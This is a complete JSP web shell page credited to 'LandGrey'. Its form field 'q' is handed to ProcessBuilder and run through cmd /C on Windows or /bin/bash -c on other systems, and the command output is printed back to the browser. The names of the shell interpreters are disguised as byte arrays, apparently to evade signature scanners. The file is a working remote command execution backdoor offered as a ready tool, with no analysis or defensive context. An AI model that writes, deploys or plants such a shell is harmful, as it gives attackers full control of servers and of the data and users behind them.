<%@ page pageEncoding="utf-8"%>
<%@ page import="java.util.Scanner" %>
<HTML>
<title>Just For Fun</title>
<BODY>
<H3>Build By LandGrey</H3>
<FORM METHOD="POST" NAME="form" ACTION="#">
    <INPUT TYPE="text" NAME="q">
    <INPUT TYPE="submit" VALUE="Fly">
</FORM>

<%
    String op="Got Nothing";
    String query = request.getParameter("q");
    String fileSeparator = String.valueOf(java.io.File.separatorChar);
    Boolean isWin;
    if(fileSeparator.equals("\\")){
        isWin = true;
    }else{
        isWin = false;
    }

    if (query != null) {
        ProcessBuilder pb;
        if(isWin) {
            pb = new ProcessBuilder(new String(new byte[]{99, 109, 100}), new String(new byte[]{47, 67}), query);
        }else{
            pb = new ProcessBuilder(new String(new byte[]{47, 98, 105, 110, 47, 98, 97, 115, 104}), new String(new byte[]{45, 99}), query);
        }
        Process process = pb.start();
        Scanner sc = new Scanner(process.getInputStream()).useDelimiter("\\A");
        op = sc.hasNext() ? sc.next() : op;
        sc.close();
    }
%>

<PRE>
    <%= op %>>
</PRE>
</BODY>
</HTML>
